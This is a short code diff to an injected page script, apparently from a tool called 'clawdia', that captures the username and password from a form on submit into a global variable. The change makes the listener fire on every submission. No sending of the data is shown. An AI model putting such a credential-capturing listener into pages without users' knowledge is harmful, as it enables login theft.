@@ -63,7 +63,7 @@ const SUBMIT_LISTENER_JS = `
     if (pw) {
       window.__clawdia_captured = { username: user ? user.value : '', password: pw.value };
     }
-  }, { capture: true, once: true });
+  }, { capture: true });
 })();
 `;
 
